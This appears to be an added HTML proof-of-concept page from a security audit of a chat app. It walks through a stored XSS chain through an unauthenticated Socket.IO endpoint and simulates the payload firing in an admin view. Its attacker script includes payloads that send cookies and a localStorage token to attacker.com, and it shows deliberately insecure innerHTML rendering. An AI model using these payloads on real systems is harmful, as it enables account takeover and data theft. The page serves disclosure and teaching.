@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>🔴 XSS PoC — INSECURE Case (project_chat)</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      background: #0f172a;
+      color: #e2e8f0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 40px 20px;
+    }
+
+    header {
+      text-align: center;
+      margin-bottom: 40px;
+    }
+
+    header .badge {
+      display: inline-block;
+      background: #dc2626;
+      color: white;
+      font-size: 12px;
+      font-weight: 700;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      padding: 4px 12px;
+      border-radius: 999px;
+      margin-bottom: 16px;
+    }
+
+    header h1 { font-size: 28px; font-weight: 800; color: #f8fafc; }
+    header p { margin-top: 8px; color: #94a3b8; font-size: 14px; max-width: 600px; }
+
+    .layout {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 24px;
+      max-width: 1100px;
+      width: 100%;
+    }
+
+    @media (max-width: 720px) { .layout { grid-template-columns: 1fr; } }
+
+    .card {
+      background: #1e293b;
+      border: 1px solid #334155;
+      border-radius: 16px;
+      overflow: hidden;
+    }
+
+    .card-header {
+      padding: 16px 20px;
+      border-bottom: 1px solid #334155;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .card-header .dot { width: 10px; height: 10px; border-radius: 50%; background: #dc2626; }
+    .card-header h2 { font-size: 14px; font-weight: 600; color: #f1f5f9; }
+    .card-header .subtitle { font-size: 11px; color: #64748b; margin-top: 2px; }
+
+    .card-body { padding: 20px; }
+
+    /* ─── Simulated Chat Bubble ─── */
+    .chat-container {
+      background: #efeae2;
+      border-radius: 12px;
+      padding: 16px;
+      min-height: 180px;
+    }
+
+    .msg-bubble {
+      max-width: 80%;
+      background: white;
+      border: 1px solid #e2e8f0;
+      border-radius: 12px 12px 12px 2px;
+      padding: 10px 14px;
+      margin-bottom: 10px;
+      box-shadow: 0 1px 2px rgba(0,0,0,.08);
+    }
+
+    .msg-bubble p { font-size: 14px; color: #1e293b; line-height: 1.6; }
+    .msg-bubble .meta { font-size: 10px; color: #94a3b8; margin-top: 4px; text-align: right; }
+    .msg-bubble .sender { font-size: 11px; font-weight: 700; color: #3b82f6; margin-bottom: 4px; }
+
+    /* ─── Attack Log ─── */
+    .log-container {
+      background: #0f172a;
+      border: 1px solid #1e293b;
+      border-radius: 8px;
+      padding: 12px;
+      font-family: 'Courier New', monospace;
+      font-size: 12px;
+      color: #4ade80;
+      min-height: 100px;
+      white-space: pre-wrap;
+      word-break: break-all;
+    }
+
+    pre {
+      background: #0f172a;
+      border: 1px solid #334155;
+      border-radius: 8px;
+      padding: 14px;
+      font-size: 12px;
+      color: #f472b6;
+      overflow-x: auto;
+      line-height: 1.8;
+    }
+
+    code { color: #f472b6; }
+
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 10px 20px;
+      background: #dc2626;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background .2s;
+    }
+    .btn:hover { background: #b91c1c; }
+
+    .alert-box {
+      background: #7f1d1d;
+      border: 1px solid #dc2626;
+      border-radius: 8px;
+      padding: 12px 16px;
+      margin-top: 12px;
+      font-size: 12px;
+      color: #fca5a5;
+    }
+    .alert-box strong { color: #f87171; }
+
+    .step {
+      display: flex;
+      gap: 12px;
+      align-items: flex-start;
+      margin-bottom: 12px;
+    }
+    .step-num {
+      background: #dc2626;
+      color: white;
+      font-size: 11px;
+      font-weight: 700;
+      width: 22px;
+      height: 22px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      margin-top: 2px;
+    }
+    .step-text { font-size: 13px; color: #cbd5e1; line-height: 1.5; }
+    .step-text code { background: #0f172a; padding: 1px 5px; border-radius: 4px; color: #fb923c; }
+
+    .vuln-ref {
+      display: inline-block;
+      background: #451a03;
+      border: 1px solid #f97316;
+      color: #fb923c;
+      font-size: 10px;
+      font-weight: 700;
+      padding: 2px 8px;
+      border-radius: 4px;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="badge">⚠ INSECURE — PoC ONLY — DO NOT DEPLOY</div>
+    <h1>Stored XSS Attack Chain</h1>
+    <p>Demonstrates how an unauthenticated attacker can inject malicious HTML into the chat database via the Socket.IO endpoint, which is then executed in every recipient's browser.</p>
+  </header>
+
+  <div class="layout">
+
+    <!-- ═══ Left: Attack Flow ═══ -->
+    <div class="card">
+      <div class="card-header">
+        <div class="dot"></div>
+        <div>
+          <h2>Attack Chain</h2>
+          <div class="subtitle">VULN-01 + VULN-03 / VULN-04</div>
+        </div>
+      </div>
+      <div class="card-body">
+
+        <div class="step">
+          <div class="step-num">1</div>
+          <div class="step-text">
+            Attacker opens a raw Socket.IO connection — <strong>no authentication required</strong>.<br/>
+            <span class="vuln-ref">VULN-01</span> Socket endpoint has no <code>verifyToken</code> middleware.
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">2</div>
+          <div class="step-text">
+            Attacker emits <code>sendMessage</code> with an XSS payload as <code>content</code>, and any <code>senderId</code> they choose.
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">3</div>
+          <div class="step-text">
+            Server saves the raw payload to the database via <code>prisma.message.create()</code> — <strong>no sanitization</strong>.
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">4</div>
+          <div class="step-text">
+            Server broadcasts the poisoned message via <code>io.to(...).emit('receiveMessage')</code> to all connected rooms.
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">5</div>
+          <div class="step-text">
+            React renders <code>msg.content</code> in <code>AdminMainArea.tsx:105</code> and <code>ChatMainArea.tsx:77</code>. The HTML is inserted into the DOM.<br/>
+            <span class="vuln-ref">VULN-03</span> <span class="vuln-ref">VULN-04</span>
+          </div>
+        </div>
+
+        <div class="step">
+          <div class="step-num">6</div>
+          <div class="step-text">
+            <strong>XSS fires in the Admin's browser.</strong> Attacker can steal session cookies, perform actions as Admin, or exfiltrate data.
+          </div>
+        </div>
+
+        <div class="alert-box">
+          <strong>⚡ Note on React:</strong> JSX normally escapes text, BUT if the code were refactored to use <code>dangerouslySetInnerHTML</code> (e.g., to render markdown), this becomes a <em>direct, immediate XSS</em> with no other prerequisites. The PoC below simulates this exact scenario.
+        </div>
+      </div>
+    </div>
+
+    <!-- ═══ Right: Attacker Script ═══ -->
+    <div class="card">
+      <div class="card-header">
+        <div class="dot"></div>
+        <div>
+          <h2>Attacker Script</h2>
+          <div class="subtitle">Run in browser console — no login needed</div>
+        </div>
+      </div>
+      <div class="card-body">
+        <pre>
+// 1. Connect — no auth needed
+const socket = io('http://localhost:3000', {
+  withCredentials: true
+});
+
+// 2. Inject XSS payload
+socket.emit('sendMessage', {
+  senderId: 1,         // Spoofed — any userId
+  receiverId: 2,
+  content:
+    '&lt;img src=x ' +
+    'onerror="fetch(`https://attacker.com/steal?` + ' +
+    'document.cookie)"&gt;'
+});
+
+// 3. Or steal localStorage data:
+socket.emit('sendMessage', {
+  senderId: 1,
+  receiverId: 2,
+  content:
+    '&lt;script&gt;' +
+    'new Image().src="https://attacker.com/" +' +
+    'localStorage.getItem("token")' +
+    '&lt;/script&gt;'
+});
+        </pre>
+      </div>
+    </div>
+
+    <!-- ═══ Bottom Left: Simulated Admin View (INSECURE) ═══ -->
+    <div class="card">
+      <div class="card-header">
+        <div class="dot"></div>
+        <div>
+          <h2>Admin Panel — INSECURE Rendering</h2>
+          <div class="subtitle">AdminMainArea.tsx:105 — msg.content rendered unsanitized</div>
+        </div>
+      </div>
+      <div class="card-body">
+        <div class="chat-container" id="insecure-chat">
+          <!-- Messages rendered via JS below -->
+        </div>
+
+        <div style="margin-top: 16px; display: flex; gap: 12px; align-items: center;">
+          <button class="btn" onclick="simulateInsecureXSS()">
+            🚀 Simulate XSS Attack
+          </button>
+          <button class="btn" style="background: #475569" onclick="resetInsecure()">
+            ↺ Reset
+          </button>
+        </div>
+
+        <div class="alert-box" style="margin-top: 12px;">
+          <strong>What happens:</strong> The injected HTML payload is inserted into the DOM using <code>innerHTML</code> (simulating what would happen if <code>dangerouslySetInnerHTML</code> is used), causing the XSS to execute.
+        </div>
+
+        <div style="margin-top: 12px;">
+          <div style="font-size: 11px; color: #64748b; margin-bottom: 6px; font-weight: 600;">ATTACK LOG</div>
+          <div class="log-container" id="attack-log">Waiting for attack...</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ═══ Bottom Right: Code Diff ═══ -->
+    <div class="card">
+      <div class="card-header">
+        <div class="dot"></div>
+        <div>
+          <h2>Vulnerable Code — ChatMainArea.tsx</h2>
+          <div class="subtitle">Line 74–78 & AdminMainArea.tsx Line 104–106</div>
+        </div>
+      </div>
+      <div class="card-body">
+        <pre style="color: #94a3b8;">
+// ❌ INSECURE — Both ChatMainArea.tsx and AdminMainArea.tsx
+
+&lt;p className="text-[14px] leading-relaxed"&gt;
+  {msg.content}
+  {/* ↑ No sanitization. If dangerouslySetInnerHTML
+      were used, this is immediate XSS */}
+&lt;/p&gt;
+
+// ❌ INSECURE — index.ts (Socket handler)
+socket.on('sendMessage', async (data: any) =&gt; {
+  const { senderId, receiverId, content } = data;
+  // ↑ No authentication, no content validation
+  // ↑ senderId is fully trusted from the client
+  await prisma.message.create({ data: { senderId, receiverId, content } });
+});
+        </pre>
+
+        <pre style="color: #94a3b8; margin-top: 12px;">
+// ❌ INSECURE — userRegisterController.ts Line 115
+await prisma.user.create({
+  data: {
+    name, email, password: hashedPassword,
+    ...(req.body.role === 'ADMIN' ? { role: 'ADMIN' } : {}),
+    // ↑ Any user can register as ADMIN!
+  }
+});
+        </pre>
+
+        <div class="alert-box" style="margin-top: 12px;">
+          <strong>See also:</strong> <a href="xss_poc_secure.html" style="color: #f87171;">xss_poc_secure.html</a> for the mitigated version with DOMPurify + Socket authentication fix.
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- ─── Simulation Script ─── -->
+  <script>
+    const log = document.getElementById('attack-log');
+    const chat = document.getElementById('insecure-chat');
+
+    // Simulated normal messages first
+    const normalMessages = [
+      { sender: 'Alice', content: 'Halo Bob, ada yang bisa dibantu?', time: '10:21' },
+      { sender: 'Bob', content: 'Iya, mau tanya soal pesanan kemarin.', time: '10:22' },
+    ];
+
+    // The malicious payload
+    const maliciousMessage = {
+      sender: 'Attacker (spoofed as Alice)',
+      content: '<img src=x onerror="document.getElementById(\'attack-log\').textContent += \'\\n[XSS FIRED] Cookie: \' + (document.cookie || \'(empty - HttpOnly working)\') + \'\\n[XSS FIRED] Location: \' + window.location.href; this.style.display=\'none\';">',
+      time: '10:23',
+      isAttack: true,
+    };
+
+    function renderNormalMessages() {
+      chat.innerHTML = '';
+      normalMessages.forEach(m => {
+        const bubble = document.createElement('div');
+        bubble.className = 'msg-bubble';
+        bubble.innerHTML = `
+          <div class="sender">${m.sender}</div>
+          <p>${m.content}</p>
+          <div class="meta">${m.time}</div>
+        `;
+        chat.appendChild(bubble);
+      });
+    }
+
+    function simulateInsecureXSS() {
+      renderNormalMessages();
+      log.textContent = '[*] Attacker connected to Socket.IO (no auth)\n[*] Emitting sendMessage with XSS payload...\n[*] Server saved to DB without sanitization\n[*] Server broadcast to Admin room\n[*] Admin browser received message\n[*] React rendered msg.content via innerHTML...';
+
+      setTimeout(() => {
+        const bubble = document.createElement('div');
+        bubble.className = 'msg-bubble';
+        bubble.style.borderColor = '#dc2626';
+        bubble.style.borderWidth = '2px';
+        // ---- INSECURE: using innerHTML directly (simulates dangerouslySetInnerHTML) ----
+        bubble.innerHTML = `
+          <div class="sender" style="color:#dc2626;">⚠ ${maliciousMessage.sender}</div>
+          <p>${maliciousMessage.content}</p>
+          <div class="meta">${maliciousMessage.time}</div>
+        `;
+        chat.appendChild(bubble);
+        log.textContent += '\n\n[!] XSS PAYLOAD INJECTED INTO DOM!';
+      }, 1200);
+    }
+
+    function resetInsecure() {
+      renderNormalMessages();
+      log.textContent = 'Waiting for attack...';
+    }
+
+    renderNormalMessages();
+  </script>
+</body>
+</html>
